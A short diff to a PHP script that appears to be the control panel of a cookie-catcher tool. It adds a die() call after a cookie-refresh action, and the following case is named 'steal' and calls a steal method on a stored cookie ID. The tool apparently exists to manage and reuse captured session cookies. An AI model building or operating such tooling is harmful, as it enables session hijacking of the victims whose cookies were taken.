@@ -34,6 +34,7 @@ if(isset($_GET['action'])) {
           $message .= $result ? "Cookie #".htmlspecialchars($cookie['id'])." Refreshed<br/>" : "An error occurred.<br/>";
         }
       }
+      die($message);
       break;
     case 'steal':
       $result = $catcher->steal($_GET['cookieID']);
